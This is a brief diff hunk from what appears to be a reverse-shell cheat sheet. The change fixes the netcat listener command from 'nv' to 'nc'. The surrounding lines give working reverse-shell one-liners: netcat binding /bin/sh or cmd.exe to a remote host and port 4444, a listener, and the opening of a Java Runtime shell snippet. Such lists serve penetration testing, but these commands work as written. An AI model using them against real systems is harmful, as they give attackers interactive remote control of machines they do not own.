@@ -18,7 +18,7 @@ nc -e /bin/sh target 4444 # linux, use /bin/bash of sh doesn't work
 nc.exe 192.168.100.113 4444 –e cmd.exe # windows
 
 # netcat listener
-nv -lvnp 4444
+nc -lvnp 4444
 
 # java
 r = Runtime.getRuntime()
